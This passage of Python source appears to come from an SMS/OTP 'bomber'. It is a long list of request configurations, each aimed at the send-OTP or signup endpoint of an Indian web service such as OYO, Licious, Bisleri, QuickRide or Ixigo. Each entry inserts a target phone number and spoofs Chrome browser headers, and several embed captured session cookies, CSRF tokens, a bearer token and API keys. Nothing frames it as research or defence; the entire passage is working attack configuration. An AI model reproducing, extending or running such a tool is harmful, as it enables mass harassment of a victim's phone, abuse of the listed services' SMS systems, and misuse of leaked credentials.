            "referer": "https://www.oyorooms.com/login?country=&retUrl=/search%3Flocation%3DGonda%252C%2520Uttar%2520Pradesh%252C%2520India%26latitude%3D27.0374187%26longitude%3D81.95348149999995%26searchType%3Dlocality%26coupon%3D%26checkin%3D25%252F06%252F2024%26checkout%3D26%252F06%252F2024%26roomConfig%255B%255D%3D1%26showSearchElements%3Dfalse%26country%3Dindia%26guests%3D1%26rooms%3D1",
            "sdata": "eyJrdWQiOlsxODc0MDAsNTA3MDAsOTA3MDAsODMzMDAsNTkxMDAsNjg4MDAsMTE4MDAwLDg2NDAwLDExOTgwMCwxMjg2MDAsMTE0NDAwLDE5NTAwMCw4MTUwMCwxMTE4MDAsMTU5MzAwLDE0MjYwMCwxNDA5MDAsNzI1NDQ3MDAsNzI3Njg4MDAsNzMwMDgxMDAsNzMxOTI1MDAsNzMzODQzMDAsNzM2MDAxMDAsNzM4MDg1MDAsNzM5Njg0MDAsNzQxNzY3MDAsNzQ0MzIzMDAsNzkwMjQ0MDAsMjAwMDAwLDExOTkwMCw0Nzk5MDAsODE1OTAwLDEwMjQwMDAsMTQzOTcwMCwyMTk5NzAwLDI1NzU3MDAsMTE0NDAwLDI1NjIzMDAsMzUyMjEwMCwxODM3MDAsMTc1NTAwLDE1OTEwMCwxOTg5MDAsMTUxNzAwLDE1MTkwMCwxNTkyMDAsMTE5NzAwLDExOTMwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6W10sInRpZCI6W10sImtpZCI6Wzk5MTMxMDAsNDEyODAwLDE4MDMwMCwxNzM4MDAsODA0MDAsMTA3OTAwLDcyNzUyMDAsNzE4MDAsMTc2MDAwLDIzMjMwMCwxNjMwMCw2MzMwMDAsMjc1MDYwMCwxODQ1MDAsMjI0NzAwLDI1MDEwMCwyMzMwMCw4MDAzMDAsMjMyMjAwLDMwMzc3MDAsMTYwMDUwMCw2NDcwMCw4MDAsMjMyNDAwLDMwNDgwMCw0ODMwMCw0ODcwMCwzMjQwMCw1NTI2MDBdLCJ0bXYiOltdfQ==",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "xsrf-token": "OP9zTOUO-KF2BfPbXRH6JwwWcsE1QiHdq7eM"
        },
        "data": lambda p, d: json.dumps({"phone": p, "country_code": "+91", "nod": 4})
    },
    
    {
        "name": "MYMA",
        "url": lambda p, d: "https://portal.myma.in/custom-api/auth/generateotp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://app.myma.in",
            "priority": "u=1, i",
            "referer": "https://app.myma.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"countrycode": "+91", "mobile": f"91{p}", "is_otpgenerated": False, "app_version": "-1"})
    },
    
    {
        "name": "Freedo Rentals",
        "url": lambda p, d: "https://api.freedo.rentals/customer/sendOtpForSignUp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://freedo.rentals/",
            "requestfrom": "customer",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-bn": "2.0.16",
            "x-channel": "WEB",
            "x-client-id": "FREEDO",
            "x-platform": "CUSTOMER"
        },
        "data": lambda p, d: json.dumps({"email_id": "user@example.com", "first_name": "User", "mobile_number": p})
    },
    
    {
        "name": "Licious",
        "url": lambda p, d: "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "source=website; _gid=GA1.2.1957294880.1719308075; WZRK_G=fd462bffc0674ad3bdf9f6b7c537c6c7; _gat=1; _gcl_au=1.1.1898387226.1719308076; ajs_anonymous_id=f59e4a4c-db21-44c5-b067-2c942debda44; location=eyJjaXBoZXJ0ZXh0IjoidWp4RnBDeXpKZU1UVHV2THJnbjZSNHZlRWRXTXRmQWhaUlJYakZJVlFFRHV1a3FkQnBwT2hTOEVwc1h4Q1ltTUJKSXozUWMxRHZUYnIvTE1LNU52VG1IVytBTEc0ZDR5dktnZ1B6MjRBWUxQK0ZzRGxScmJMTXo3MU85bDJXdStISDhuQmdYRkZ5eEdteU44VVBqbDFlTzV5dEQvY1NSQTZ1MitORzhIajZKZXJma093QjJ1a2tVeEJrYWtIQWRmaHE3d0E4Sm41cWtCQmNYNUZxUUk0S1RYVjZudHBXYTBPcEViVHkxMmVuNEZjUXAyb2ZzU2M4eTkvWTlvWnV4UFNFZ0x6M0tTMXlmc0ZBN25MUWZ6RG0rbkt1SE5sMVpLMDFkU0VXaHVPMmQxUlFZemJ3NzF4QWsveWNUSDBwS2JoaitUaEZJY1M0NFZLWmsrK3A4K0VSU2pqNDJ2RG5RZU05NVUrYVEzOFI2UUR4RWRDV3hubVdoL3oyRWg0ZFJyIiwiaXYiOiI1YzlmNjlmMGNmOGY3ZjgwMWU3ZTEzZWRkNzQ5MDVmNiIsInNhbHQiOiJjZGMzYTZkNTI5Nzc3MWJmN2UzODE1NDI1ZmQ1YzYwZWM2MDU2N2U0ZmRhMzQ5ODg1OTQxYTM0MTFhODBjNDgyOTdhZTA1M2Q1ZjcxOWJkMWQ0OTk0OGEwYTU0ZjYzYjE0YmQ0NDc5NTAyZWZjZWFlOGQyMDM3MDQ3NzM3NmI4NTQxOWVhYmJlZDc1YWVlMTY2NjE1NzM3MzRhYTUxOWJmY2ExZGIxYzQ2MmU1NzBmNzQ1NDIwM2JhZWFjYmNmOGQ5MTQ3OThjNDEwNjllYWJhM2ViY2Q5Y2E4OTUwMDJmOTQ2YTIyYjllZjE4ZGJkZWZjZTg0YTU0OGU3MWFkMTEwZDc4MmZjNDVhYjYxYzg4ZWY1ZmRkODM3NGE1ZTkxODg2N2NjZDc3ODA0MmQzYjUzMmFjMzVkMTVmYjU0NzQ3NmY1Njg0NjJmNmE2Y2I2MTQ2NjZjODU1ZThjOWI0ZWMyZGVlOTlmMTdiZDkxZjMwMDI1NGMyMTNjOGUzNTY4YTEyNjFhZGY4ZTYxMGZmYmIxZmZiODgzMDQ5OGIxNGMyYzk5NDI4ODY1MmYzZjcxOTExOWFiZTRjODQyZTk4MjAxNDlmOWJiZDU4ZTgzMmYyYWI3OTQzZWY3YThjYjc1NDFjZjIxZGUxM2FkOTQ0ZGRkZjdjOTk1MTlmYTk4ZGE0MiIsIml0ZXJhdGlvbnMiOjk5OX0=; _ga_YN0TX18PEE=GS1.1.1719308076.1.1.1719308104.0.0.0; _ga=GA1.1.2028763947.1719308075; nxt=eyJjaXBoZXJ0ZXh0IjoiUXB4VkE1a2swL0FQQzB4SytuUzdiSVNaUDJkOS8rNDNEb2orQktNTVdhST0iLCJpdiI6Ijk1NTBiZDY1NzYwYjYxNGU1MDZkZTEzZjk5ODFlZThkIiwic2FsdCI6ImVjYzQ0MTNjZTllOGJhNTA3OTJjYzhmZTMyZjc0NTQ1MzI5NTNhNmY5Mjg1NWU4MmMzMzA0MWZiODc1ZmQzNTIyZjcyMjllZTViNTRmY2Y5YTVjYzJlYThkMDFlNGJhOTA0NDA5OGYxMjVhMDIxYTUzYzY3ZDA2N2I0MjJhNDAwM2U3NGUxOGVlYTIzZGE5YTUyNmQyOTgzYTU5NTQ0MjlhMTRiOTAzZDJjY2RlNTIyNmI3ZmI3MjdjZmVkMTJkZGQ4OTgzMWQ4MTJjYWMxMTRhMjI1MmEwMjFjOWYxYTM2NzFhOTVkZmUxNjNhNjI4ZjYxYzg3MWI4ZWQzZTUzN2NjOGM1YTNlNjQzNDdlYjY5MzQ0MWU2YWZjYTkyODlkMTcxOGQ2ODI5ZTJkN2Y1MjhhNzQzNjY4OGRmMjFmZGJiNWEwYWM5NTYyODMyNTQ4NzJhOThmOWEyODA2ZDhjZmVmNWNkOTA2MmE0NDc3YjY0ODk3ZGQ1Y2RlNjEyZWFhOTdmMGI1MDEwNDE2MjRkNzUyNDg5NDIyYmE0MmQwMzFjZGI2NWU1NjA5NTQ3ZjA2ZGQ0MDVmNjZjM2VmYjIzZWFjOTk1MTM4MTEzZGE5ZTFkNjFkYWFmZDJlMDJlOWZkMGEzNDVmMDNiNjFhNzU5OTlmYTM3NmZjZjIwMTIwOTUwIiwiaXRlcmF0aW9ucyI6OTk5fQ==; WZRK_S_445-488-5W5Z=%7B%22p%22%3A3%2C%22s%22%3A1719308078%2C%22t%22%3A1719308110%7D",
            "origin": "https://www.licious.in",
            "priority": "u=1, i",
            "referer": "https://www.licious.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "serverside": "false",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-csrf-token": ""
        },
        "data": lambda p, d: json.dumps({"phone": p, "captcha_token": None})
    },
    
    {
        "name": "Cosmofeed",
        "url": lambda p, d: "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cosmofeed-request-id": "fe247a51-c977-4882-a9b8-fe303692ddc3",
            "origin": "https://superprofile.bio",
            "priority": "u=1, i",
            "referer": "https://superprofile.bio/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"phoneNumber": p, "countryCode": "+91", "data": {"email": "user@gmail.com"}, "authScreen": "signup-screen", "userIsConvertingToCreator": False})
    },
    
    {
        "name": "Bisleri",
        "url": lambda p, d: "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.bisleri.com",
            "priority": "u=1, i",
            "referer": "https://www.bisleri.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-requested-with": "7Yhm6b86qTsrpcMWtUixPLnv02nHf3wFf5vkukwu"
        },
        "data": lambda p, d: json.dumps({"email": "user@gmail.com", "mobile": p})
    },
    
    {
        "name": "EvitalRx",
        "url": lambda p, d: "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        "method": "POST",
        "headers": {
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": "https://pharmacy.evitalrx.in/",
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda p, d: json.dumps({"pharmacy_name": "Pharmacy", "mobile": p, "referral_code": "", "email_id": "user@gmail.com", "zip_code": "110086", "device_id": "f2cea99f-381d-432d-bd27-02bc6678fa93", "app_version": "desktop", "device_name": "Chrome", "device_model": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "device_manufacture": "Windows", "device_release": "windows-10", "device_sdk_version": "126.0.0.0"})
    },
    
    {
        "name": "QuickRide",
        "url": lambda p, d: "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        "method": "POST",
        "headers": {
            "APP-TOKEN": "s16-q9fz-jy3p-rk",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIwIiwiaXNzIjoiUXVpY2tSaWRlIiwiaWF0IjoxNTI2ODg2NzU1fQ.nsy3UbPnaANf7d3O0xAW3LTG1P-dgcEhgqwOey-IK2kFCGxr298jfLKkE2k6taTvzETpJMPpertJu3uzJDtDUQ",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "_ga_S6LZW9RD9Z=GS1.1.1719144863.1.0.1719144863.0.0.0; _ga=GA1.2.2033204632.1719144864; _gid=GA1.2.502724273.1719144864; _gat_gtag_UA_139055405_3=1; _gat_UA-139055405-3=1",
            "Origin": "https://pwa.getquickride.com",
            "Referer": "https://pwa.getquickride.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda p, d: f"contactNo={p}&countryCode=%2B91&appName=Quick%20Ride&payload=&signature=&signatureAlgo=&domainName=pwa.getquickride.com"
    },
    
    {
        "name": "Clovia",
        "url": lambda p, d: f"https://www.clovia.com/api/v4/signup/check-existing-user/?phone={p}&isSignUp=true&email=&is_otp=True&token",
        "method": "GET",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cookie": 'comp_par="utm_campaign=70553\054firstclicktime=2024-06-23 17:18:10.351125\054utm_medium=ppc\054http_referer=https://www.google.com/\054utm_source=10001"; cr_id_last=None; last_source_time="2024-06-23 17:18:10.351039"; last_source=10001; nur=None; sessionid=2kp1dzotrgpe698bfanq4tp4qechv2ln; data_in_visits="10001&2024-06-23 17:18:10.350961\054"; csrftoken=UrmVVY4g3YmpffRV3Rdznqrq2kBLItpN; utm_campaign_last=70553; __cf_bm=HdXzeqlgG6io1sY6qie2eVJ74XMfXuLRNJIs.oTzbho-1719143290-1.0.1.1-Op8tdLoYJnUoaXpFfk927ZZafyzjr3qZ5z2ejJCkf8HmQTPzaaGR.erei72oVEdSsJx_1XTH1zQNpmsn9zLAig; _cfuvid=T_lLlwC6IEneinYAELiGdaxZlBaqKOZ8upanwvhyZiE-1719143290370-0.0.1.1-604800000; fw_utm={%22value%22:%22{%5C%22utm_source%5C%22:%5C%2210001%5C%22%2C%5C%22utm_medium%5C%22:%5C%22ppc%5C%22%2C%5C%22utm_campaign%5C%22:%5C%2270553%5C%22}%22%2C%22createTime%22:%222024-06-23T11:48:13.312Z%22}; fw_uid={%22value%22:%2292f5a144-b31b-4b24-96c6-d894804e5039%22%2C%22createTime%22:%222024-06-23T11:48:13.337Z%22}; fw_se={%22value%22:%22fws2.c48f4a93-0256-4df1-ae3f-2d33f47d61d6.1.1719143293468%22%2C%22createTime%22:%222024-06-23T11:48:13.468Z%22}; G_ENABLED_IDPS=google; _gid=GA1.2.767062449.1719143297; _gac_UA-62869587-1=1.1719143297.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _gcl_au=1.1.385881254.1719143298; _gcl_gs=2.1.k1$i1719143288; _gac_UA-62869587-2=1.1719143298.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _fbp=fb.1.1719143298995.264854070543037114; _ga_MF23YQ1Y0R=GS1.2.1719143300.1.0.1719143300.60.0.0; _ga=GA1.1.991595777.1719143297; _gcl_aw=GCL.1719143303.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _ga_TC6QEKJ4BS=GS1.1.1719143302.1.0.1719143302.60.0.0; _ga_ZMCTPTF5ZP=GS1.2.1719143304.1.0.1719143304.60.0.0; _clck=ggl1zg%7C2%7Cfmv%7C0%7C1635; _clsk=1iq7ave%7C1719143306731%7C1%7C1%7Cr.clarity.ms%2Fcollect; moe_uuid=b79017f8-6aad-4af9-b387-8dfef3749d3f',
            "priority": "u=1, i",
            "referer": "https://www.clovia.com/?utm_source=10001&utm_medium=ppc&utm_term=clovia_brand&utm_campaign=70553&gad_source=1&gclid=EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None
    },
    
    {
        "name": "KwikFix",
        "url": lambda p, d: "https://admin.kwikfixauto.in/api/auth/signupotp/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://kwikfixauto.in",
            "priority": "u=1, i",
            "referer": "https://kwikfixauto.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"phone": p})
    },
    
    {
        "name": "Brevistay",
        "url": lambda p, d: "https://www.brevistay.com/cst/app-api/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "authorization": "Bearer null",
            "brevi-channel": "DESKTOP_WEB",
            "brevi-channel-version": "40.0.0",
            "content-type": "application/json",
            "cookie": "WZRK_G=e35f2d1372894c078327721b0dce1643; PHPSESSID=t012m1s7ml0b1hrrt0clq063a0; _gcl_au=1.1.450954870.1719050061; _gid=GA1.2.2009705537.1719050079; _gat_UA-76491234-1=1; _ga_WRZEGYZRTW=GS1.1.1719050079.1.0.1719050079.0.0.1234332753; WZRK_S_R9Z-654-466Z=%7B%22p%22%3A2%2C%22s%22%3A1719050070%2C%22t%22%3A1719050079%7D; _clck=jleo6d%7C2%7Cfmu%7C0%7C1634; FPID=FPID2.2.as0IAmsiCa%2FP1407PbQfVL1Cc6nZ8u9zt2atD67UFIg%3D.1719050076; FPGSID=1.1719050080.1719050080.G-WRZEGYZRTW.SFwCEJeloGt9Yand3iX5MA; _fbp=fb.1.1719050080798.755777096366214429; FPLC=SlslklfyB3CaJY%2FHqIBvl5T3%2BI4dZHhl0NlWIJSwxvEmGnCsD4K%2Fechm2wpS0K3EgQCtOmHpqIBDQYTq5BsZTmC%2BDvjIVHjpREcazaWVfqimPEXJb5W63br788Qq2g%3D%3D; _clsk=1r9n9qk%7C1719050081944%7C1%7C1%7Cq.clarity.ms%2Fcollect; _ga=GA1.2.1921624223.1719050076; _ga_B5ZBCV939N=GS1.1.1719050079.1.0.1719050085.54.0.0",
            "origin": "https://www.brevistay.com",
            "priority": "u=1, i",
            "referer": "https://www.brevistay.com/login?red=/hotels-in-lucknow",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"is_otp": 1, "is_password": 0, "mobile": p})
    },
    
    {
        "name": "HourlyRooms",
        "url": lambda p, d: "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Cookie": "_gcl_au=1.1.994375249.1719049925; _ga=GA1.1.2131701644.1719049925; _ga_Q8HTW71CLJ=GS1.1.1719049925.1.1.1719049936.49.0.0; _ga_BLPG4SY73M=GS1.1.1719049925.1.1.1719049944.41.0.0; _ga_E0K0Q2R7S0=GS1.1.1719049925.1.1.1719049944.0.0.0",
            "Origin": "https://hourlyrooms.co.in",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "access-control-allow-credentials": "true",
            "access-control-allow-origin": "*",
            "content-type": "application/json",
            "platform": "web-2.0.0",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda p, d: json.dumps({"phone": p})
    },
    
    {
        "name": "MadrasMandi",
        "url": lambda p, d: "https://api.madrasmandi.in/api/v1/auth/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ",
            "delivery-type": "instant",
            "mm-build-version": "1.0.1",
            "mm-device-type": "web",
            "origin": "https://madrasmandi.in",
            "priority": "u=1, i",
            "referer": "https://madrasmandi.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: f'------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{p}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n'
    },
    
    {
        "name": "BharatLoan",
        "url": lambda p, d: "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "ci_session=2s7ip3dak5aif2ka77sd2bn9i4nluq2h; _ga=GA1.1.963974262.1718969064; _gcl_au=1.1.1625156903.1718969064; _fbp=fb.1.1718969073282.994122455798043230; _ga_EWGNR5NDJB=GS1.1.1718969063.1.1.1718969167.41.0.0",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda p, d: f"mobile={p}&current_page=login&is_existing_customer=2"
    },
    
    {
        "name": "Pagarbook",
        "url": lambda p, d: "https://api.pagarbook.com/api/v5/auth/otp/request",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "appversioncode": "5268",
            "clientbuildnumber": "5268",
            "clientplatform": "WEB",
            "content-type": "application/json",
            "origin": "https://web.pagarbook.com",
            "priority": "u=1, i",
            "referer": "https://web.pagarbook.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "userrole": "EMPLOYER"
        },
        "data": lambda p, d: json.dumps({"phone": p, "language": 1})
    },
    
    {
        "name": "Vahak",
        "url": lambda p, d: "https://api.vahak.in/v1/u/o_w",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.vahak.in",
            "priority": "u=1, i",
            "referer": "https://www.vahak.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"phone_number": p, "scope": 0, "request_meta_data": "X0oLFl9sAAZzHuhTmaHk5Bbd+HFZDh+P9J6JhPghG2V1Ymi6OPEu0TH1vS2J2tc58KI/YpjG5tiqVlDkbBCMQCneV7fXtTsYRjhF8FfVNac=", "is_whatsapp": False})
    },
    
    {
        "name": "Redcliffe Labs",
        "url": lambda p, d: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://redcliffelabs.com",
            "priority": "u=1, i",
            "referer": "https://redcliffelabs.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"phone_number": p, "short": True})
    },
    
    {
        "name": "Ixigo",
        "url": lambda p, d: "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "apikey": "ixiweb\u00212$",
            "clientid": "ixiweb",
            "content-type": "application/x-www-form-urlencoded",
